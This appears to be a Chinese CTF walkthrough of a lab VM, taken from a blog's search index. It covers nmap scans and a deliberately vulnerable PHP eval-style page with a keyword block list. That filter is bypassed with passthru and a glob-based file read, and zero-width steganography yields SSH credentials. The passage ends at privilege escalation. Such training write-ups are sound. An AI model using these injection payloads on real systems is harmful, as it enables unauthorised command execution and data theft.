<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Ftc</title>
    <link href="/Maze-sec/Ftc/"/>
    <url>/Maze-sec/Ftc/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li>QQ群：<code>660930334</code></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sn 192.168.2.0/24              <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-05 09:55 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00061s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00053s latency).<br>MAC Address: 08:00:27:02:7F:AE (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.106<br>Host is up (0.00085s latency).<br>MAC Address: 08:00:27:C9:A1:AB (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.02 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.106</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.106                       <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-05 09:55 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.106<br>Host is up (0.00044s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>8080/tcp open  http-proxy<br>MAC Address: 08:00:27:C9:A1:AB (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 2.93 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、80、8080</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80,8080 192.168.2.106<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-05 09:56 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.106<br>Host is up (0.0011s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp   open  http    (PHP 8.2.29)<br>| fingerprint-strings: <br>|   GetRequest, HTTPOptions: <br>|     HTTP/1.0 200 OK<br>|     Date: Wed, 07 Jan 2026 06:59:51 GMT<br>|     Connection: close<br>|     X-Powered-By: PHP/8.2.29<br>|     Content-<span class="hljs-built_in">type</span>: text/html; charset=UTF-8<br>|     &lt;code&gt;&lt;span style=<span class="hljs-string">&quot;color: #000000&quot;</span>&gt;<br>|     &lt;span style=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;&amp;lt;?php<br>|     /&gt;error_reporting&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;(&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;0&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;);<br>|     /&gt;&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;highlight_file&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;(&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;__FILE__&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;);<br>|     /&gt;&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #FF8000&quot;</span>&gt;//&amp;nbsp;<br>|     flag<br>|     /&gt;&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;<span class="hljs-variable">$funtion</span>&amp;nbsp;&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;=&amp;nbsp;&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;<span class="hljs-variable">$_POST</span>&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;[&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #DD0000&quot;</span>&gt;<span class="hljs-string">&#x27;function&#x27;</span>&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;];<br>|_    /&gt;&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;<br>|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="hljs-string">8080/tcp open  http    (PHP 8.2.29)</span><br><span class="hljs-string">|_http-title: Site doesn&#x27;</span>t have a title (text/html; charset=UTF-8).<br>| fingerprint-strings: <br>|   GetRequest: <br>|     HTTP/1.0 200 OK<br>|     Date: Wed, 07 Jan 2026 06:59:51 GMT<br>|     Connection: close<br>|     X-Powered-By: PHP/8.2.29<br>|_    Content-<span class="hljs-built_in">type</span>: text/html; charset=UTF-8<br>|_http-open-proxy: Proxy might be redirecting requests<br>2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============<br>SF-Port80-TCP:V=7.94SVN%I=7%D=1/7%Time=695E0468%P=x86_64-pc-linux-gnu%r(Ge<br>SF:tRequest,80E,<span class="hljs-string">&quot;HTTP/1\.0\x20200\x20OK\r\nDate:\x20Wed,\x2007\x20Jan\x202</span><br><span class="hljs-string">SF:026\x2006:59:51\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/</span><br><span class="hljs-string">SF:8\.2\.29\r\nContent-type:\x20text/html;\x20charset=UTF-8\r\n\r\n&lt;code&gt;&lt;</span><br><span class="hljs-string">SF:span\x20style=\&quot;color:\x20#000000\&quot;&gt;\n&lt;span\x20style=\&quot;color:\x20#0000B</span><br><span class="hljs-string">SF:B\&quot;&gt;&amp;lt;\?php\r&lt;br\x20/&gt;error_reporting&lt;/span&gt;&lt;span\x20style=\&quot;color:\x</span><br><span class="hljs-string">SF:20#007700\&quot;&gt;\(&lt;/span&gt;&lt;span\x20style=\&quot;color:\x20#0000BB\&quot;&gt;0&lt;/span&gt;&lt;span</span><br><span class="hljs-string">SF:\x20style=\&quot;color:\x20#007700\&quot;&gt;\);\r&lt;br\x20/&gt;&lt;/span&gt;&lt;span\x20style=\&quot;c</span><br><span class="hljs-string">SF:olor:\x20#0000BB\&quot;&gt;highlight_file&lt;/span&gt;&lt;span\x20style=\&quot;color:\x20#007</span><br><span class="hljs-string">SF:700\&quot;&gt;\(&lt;/span&gt;&lt;span\x20style=\&quot;color:\x20#0000BB\&quot;&gt;__FILE__&lt;/span&gt;&lt;spa</span><br><span class="hljs-string">SF:n\x20style=\&quot;color:\x20#007700\&quot;&gt;\);\r&lt;br\x20/&gt;&lt;/span&gt;&lt;span\x20style=\&quot;</span><br><span class="hljs-string">SF:color:\x20#FF8000\&quot;&gt;//&amp;nbsp;\xe6\xa0\xb9\xe7\x9b\xae\xe5\xbd\x95\xe4\xb</span><br><span class="hljs-string">SF:8\x8b\xe7\x9a\x84flag\r&lt;br\x20/&gt;&lt;/span&gt;&lt;span\x20style=\&quot;color:\x20#0000</span><br><span class="hljs-string">SF:BB\&quot;&gt;\$funtion&amp;nbsp;&lt;/span&gt;&lt;span\x20style=\&quot;color:\x20#007700\&quot;&gt;=&amp;nbsp;</span><br><span class="hljs-string">SF:&lt;/span&gt;&lt;span\x20style=\&quot;color:\x20#0000BB\&quot;&gt;\$_POST&lt;/span&gt;&lt;span\x20styl</span><br><span class="hljs-string">SF:e=\&quot;color:\x20#007700\&quot;&gt;\[&lt;/span&gt;&lt;span\x20style=\&quot;color:\x20#DD0000\&quot;&gt;&#x27;</span><br><span class="hljs-string">SF:function&#x27;&lt;/span&gt;&lt;span\x20style=\&quot;color:\x20#007700\&quot;&gt;\];\r&lt;br\x20/&gt;&lt;/sp</span><br><span class="hljs-string">SF:an&gt;&lt;span\x20style=\&quot;color:\x20#0000BB\&quot;&gt;&quot;</span>)%r(HTTPOptions,80E,<span class="hljs-string">&quot;HTTP/1\.0</span><br><span class="hljs-string">SF:\x20200\x20OK\r\nDate:\x20Wed,\x2007\x20Jan\x202026\x2006:59:51\x20GMT\</span><br><span class="hljs-string">SF:r\nConnection:\x20close\r\nX-Powered-By:\x20PHP/8\.2\.29\r\nContent-typ</span><br><span class="hljs-string">SF:e:\x20text/html;\x20charset=UTF-8\r\n\r\n&lt;code&gt;&lt;span\x20style=\&quot;color:\</span><br><span class="hljs-string">SF:x20#000000\&quot;&gt;\n&lt;span\x20style=\&quot;color:\x20#0000BB\&quot;&gt;&amp;lt;\?php\r&lt;br\x20/</span><br><span class="hljs-string">SF:&gt;error_reporting&lt;/span&gt;&lt;span\x20style=\&quot;color:\x20#007700\&quot;&gt;\(&lt;/span&gt;&lt;s</span><br><span class="hljs-string">SF:pan\x20style=\&quot;color:\x20#0000BB\&quot;&gt;0&lt;/span&gt;&lt;span\x20style=\&quot;color:\x20#</span><br><span class="hljs-string">SF:007700\&quot;&gt;\);\r&lt;br\x20/&gt;&lt;/span&gt;&lt;span\x20style=\&quot;color:\x20#0000BB\&quot;&gt;high</span><br><span class="hljs-string">SF:light_file&lt;/span&gt;&lt;span\x20style=\&quot;color:\x20#007700\&quot;&gt;\(&lt;/span&gt;&lt;span\x2</span><br><span class="hljs-string">SF:0style=\&quot;color:\x20#0000BB\&quot;&gt;__FILE__&lt;/span&gt;&lt;span\x20style=\&quot;color:\x20</span><br><span class="hljs-string">SF:#007700\&quot;&gt;\);\r&lt;br\x20/&gt;&lt;/span&gt;&lt;span\x20style=\&quot;color:\x20#FF8000\&quot;&gt;//&amp;</span><br><span class="hljs-string">SF:nbsp;\xe6\xa0\xb9\xe7\x9b\xae\xe5\xbd\x95\xe4\xb8\x8b\xe7\x9a\x84flag\r</span><br><span class="hljs-string">SF:&lt;br\x20/&gt;&lt;/span&gt;&lt;span\x20style=\&quot;color:\x20#0000BB\&quot;&gt;\$funtion&amp;nbsp;&lt;/s</span><br><span class="hljs-string">SF:pan&gt;&lt;span\x20style=\&quot;color:\x20#007700\&quot;&gt;=&amp;nbsp;&lt;/span&gt;&lt;span\x20style=\</span><br><span class="hljs-string">SF:&quot;</span>color:\x20#0000BB\&quot;&gt;\<span class="hljs-variable">$_POST</span>&lt;/span&gt;&lt;span\x20style=\&quot;color:\x20#007700\&quot;<br>SF:&gt;\[&lt;/span&gt;&lt;span\x20style=\&quot;color:\x20#DD0000\&quot;&gt;<span class="hljs-string">&#x27;function&#x27;</span>&lt;/span&gt;&lt;span\x<br>SF:20style=\&quot;color:\x20#007700\&quot;&gt;\];\r&lt;br\x20/&gt;&lt;/span&gt;&lt;span\x20style=\&quot;col<br>SF:or:\x20#0000BB\&quot;&gt;<span class="hljs-string">&quot;);</span><br><span class="hljs-string">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="hljs-string">SF-Port8080-TCP:V=7.94SVN%I=7%D=1/7%Time=695E0468%P=x86_64-pc-linux-gnu%r(</span><br><span class="hljs-string">SF:GetRequest,902,&quot;</span>HTTP/1\.0\x20200\x20OK\r\nDate:\x20Wed,\x2007\x20Jan\x2<br>SF:02026\x2006:59:51\x20GMT\r\nConnection:\x20close\r\nX-Powered-By:\x20PH<br>SF:P/8\.2\.29\r\nContent-<span class="hljs-built_in">type</span>:\x20text/html;\x20charset=UTF-8\r\n\r\n\xe5\<br>SF:x8f\xaf\xe6\x83\x9c\xe6\xb2\xa1\xe5\xa6\x82\xe6\x9e\x9c\r\n\xe6\x9e\x97<br>SF:\xe4\xbf\x8a\xe6\x9d\xb0\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8<br>SF:c\xe2\x80\x8d\xef\xbb\xbf\xe2\x80\xac\xe2\x80\x8c\r\n\xe5\x81\x87\xe5\x<br>SF:a6\x82\xe6\x8a\x8a\xe7\x8a\xaf\xe5\xbe\x97\xe8\xb5\xb7\xe7\x9a\x84\xe9\<br>SF:x94\x99\r\n\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8d<br>SF:\xe2\x80\xac\xef\xbb\xbf\xe2\x80\x8d\xe8\x83\xbd\xe9\x94\x99\xe7\x9a\x8<br>SF:4\xe9\x83\xbd\xe9\x94\x99\xe8\xbf\x87\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x<br>SF:8c\xe2\x80\x8c\xe2\x80\x8d\xe2\x80\xac\xe2\x80\x8d\xef\xbb\xbf\r\n\xe5\<br>SF:xba\x94\xe8\xaf\xa5\xe8\xbf\x98\xe6\x9d\xa5\xe5\xbe\x97\xe5\x8f\x8a\xe5<br>SF:\x8e\xbb\xe6\x82\x94\xe8\xbf\x87\r\n\xe5\x81\x87\xe5\xa6\x82\xe6\xb2\xa<br>SF:1\xe6\x8a\x8a\xe4\xb8\x80\xe5\x88\x87\xe8\xaf\xb4\xe7\xa0\xb4\r\n\xe9\x<br>SF:82\xa3\xe4\xb8\x80\xe5\x9c\xba\xe5\xb0\x8f\xe9\xa3\x8e\xe6\xb3\xa2\xe5\<br>SF:xb0\x86\xe4\xb8\x80\xe7\xac\x91\xe5\xb8\xa6\xe8\xbf\x87\r\n\xe2\x80\x8c<br>SF:\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8d\xe2\x80\xac\xef\xbb\xb<br>SF:f\xe2\x80\x8d\xe5\x9c\xa8\xe6\x84\x9f\xe6\x83\x85\xe9\x9d\xa2\xe5\x89\x<br>SF:8d\xe8\xae\xb2\xe4\xbb\x80\xe4\xb9\x88\xe8\x87\xaa\xe6\x88\x91\xe2\x80\<br>SF:x8c\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8d\xef\xbb\xbf\xe2\x80<br>SF:\xac\xe2\x80\x8c\r\n\xe8\xa6\x81\xe5\xbe\x97\xe8\xbf\x87\xe4\xb8\x94\xe<br>SF:8\xbf\x87\xe6\x89\x8d\xe5\xa5\xbd\xe8\xbf\x87\r\n\xe5\x85\xa8\xe9\x83\x<br>SF:bd\xe6\x80\xaa\xe6\x88\x91\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\<br>SF:x8c\xe2\x80\x8d\xe2\x80\xac\xe2\x80\xac\xe2\x80\xac\r\n\xe4\xb8\x8d\xe8<br>SF:\xaf\xa5\xe6\xb2\x89\xe9\xbb\x98\xe6\x97\xb6\xe6\xb2\x89\xe9\xbb\x98\xe<br>SF:8\xaf\xa5\xe5\x8b\x87\xe6\x95\xa2\xe6\x97\xb6\xe8\xbd\xaf\xe5\xbc\xb1\r<br>SF:\n\xe5\xa6\x82\xe6\x9e\x9c\xe4\xb8\x8d\xe6\x98\xaf\xe6\x88\x91\r\n\xe8\<br>SF:xaf\xaf\xe4\xbc\x9a\xe8\x87\xaa\xe5\xb7\xb1\xe6\xb4\x92\xe8\x84\xb1\xe8<br>SF:\xae\xa9\xe6\x88\x91\xe4\xbb\xac\xe9\x9a\xbe\xe8\xbf\x87\xe2\x80\x8c\xe<br>SF:2\x80\x8c\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8d\xef\xbb\xbf\xe2\x80\x8c\x<br>SF:ef\xbb\xbf\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8c\<br>SF:xef\xbb\xbf\xe2\x80\xac\xe2\x80\xac\r\n\xe5\x8f\xaf\xe5\xbd\x93\xe5\x88<br>SF:\x9d\xe7\x9a\x84\xe4\xbd\xa0\xe5\x92\x8c\xe7\x8e\xb0\xe5\x9c\xa8\xe7\x9<br>SF:a\x84\xe6\x88\x91\r\n\xe5\x81\x87\xe5\xa6\x82\xe9\x87\x8d\xe6\x9d\xa5\x<br>SF:e8\xbf\x87\r\n\xe5\x80\x98\xe8\x8b\xa5\xe9\x82\xa3\xe5\xa4\xa9\r\n\xe2\<br>SF:x80\x8c\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8d\xe2\x80\x8d\xe2<br>SF:\x80\x8c\xef\xbb\xbf\xe6\x8a\x8a\xe8\xaf\xa5\xe8\xaf\xb4\xe7\x9a\x84\xe<br>SF:8\xaf\x9d\xe5\xa5\xbd\xe5\xa5\xbd\xe8\xaf\xb4\r\n\xe8\xaf\xa5\xe4\xbd\x<br>SF:93\xe8\xb0\x85\xe7\x9a\x84\xe4\xb8\x8d\xe6\x89\xa7\xe7\x9d\x80\r\n\xe5\<br>SF:xa6\x82\xe6\x9e\x9c\xe9\x82\xa3\xe5\xa4\xa9\xe6\x88\x91\r\n\xe4\xb8\x8d<br>SF:\xe5\x8f\x97\xe6\x83\x85\xe7\xbb\xaa\xe6\x8c\x91\xe6\x8b\xa8\xe2\x80\x8<br>SF:c\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8d\xef\xbb\xbf\xe2\x80\x<br>SF:ac\xe2\x80\x8d\r\n\xe4\xbd\xa0\xe4\xbc\x9a\xe6\x80\x8e\xe4\xb9\x88\xe5\<br>SF:x81\x9a\r\n\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8c\xe2\x80\x8d<br>SF:\xe2\x80\xac\xe2\x80\x8c\xe2\x80\x8d<span class="hljs-string">&quot;);</span><br><span class="hljs-string">MAC Address: 08:00:27:C9:A1:AB (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 21.20 seconds</span><br></code></pre></td></tr></table></figure><h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sU --top-ports 100 192.168.2.106                         <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-05 09:57 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.106<br>Host is up (0.0018s latency).<br>All 100 scanned ports on 192.168.2.106 are <span class="hljs-keyword">in</span> ignored states.<br>Not shown: 57 closed udp ports (port-unreach), 43 open|filtered udp ports (no-response)<br>MAC Address: 08:00:27:C9:A1:AB (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 54.57 seconds<br></code></pre></td></tr></table></figure><h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><h2 id="1、80端口"><a href="#1、80端口" class="headerlink" title="1、80端口"></a>1、80端口</h2><p>查看80端口，发现是一段php命令执行代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// 根目录下的flag</span><br><span class="hljs-variable">$funtion</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;function&#x27;</span>];<br><span class="hljs-variable">$args</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;args&#x27;</span>];<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/system|exec|eval|phpinfo/i&quot;</span>,<span class="hljs-variable">$funtion</span>)&amp;&amp;!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/(cat|ls|f|l|g|more|head|grep|r|sort|ph|n|less|e|[\\\_~*?\$])/i&quot;</span>,<span class="hljs-variable">$args</span>))&#123;<br><span class="hljs-variable">$funtion</span>(<span class="hljs-variable">$args</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono&quot;</span>;<br>&#125; <br></code></pre></td></tr></table></figure><p>经过分析，没有过滤函数<code>passthru</code>，尝试执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span>=passthru&amp;args=<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601071453027.png"></p><p>尝试读取根目录下面的flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span>=passthru&amp;args=<span class="hljs-built_in">tac</span> /[a-z][a-z]a[a-z]<br></code></pre></td></tr></table></figure><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601071456803.png"><br>找到FLAG：<code>LlB45/KQFm</code></p><h2 id="2、8080端口"><a href="#2、8080端口" class="headerlink" title="2、8080端口"></a>2、8080端口</h2><p>访问8080端口，发现是一首歌词<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601071458715.png"></p><p>提示是unicode零宽字符隐写<br><a href="https://330k.github.io/misc_tools/unicode_steganography.html">Unicode Steganography with Zero-Width Characters</a></p><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601071500112.png"></p><p>找到：<code>xmgmxjs:SyalwLO+pmWicb......</code></p><p>结合之前拿到的FLAG，拼接起来组合成一组凭据<code>xmgmxjs:SyalwLO+pmWicbLlB45/KQFm</code></p><h1 id="三、获取xmgmxjs权限"><a href="#三、获取xmgmxjs权限" class="headerlink" title="三、获取xmgmxjs权限"></a>三、获取xmgmxjs权限</h1><p>使用凭据进行登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# ssh xmgmxjs@192.168.2.106<br>xmgmxjs@FCT:~$ <span class="hljs-built_in">id</span><br>uid=1000(xmgmxjs) gid=1000(xmgmxjs) <span class="hljs-built_in">groups</span>=1000(xmgmxjs)<br></code></pre></td></tr></table></figure><h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><p>查看<code>sudo -l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">xmgmxjs@FCT:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> xmgmxjs on FCT:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>Runas and Command-specific defaults <span class="hljs-keyword">for</span> 